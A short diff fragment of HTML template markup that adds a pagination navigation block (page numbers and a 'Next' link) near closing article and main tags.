         </article>
         
 </section>
+
+  <nav class="page-nav">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
 
     </main>
     <a class="not-found">not found!</a>
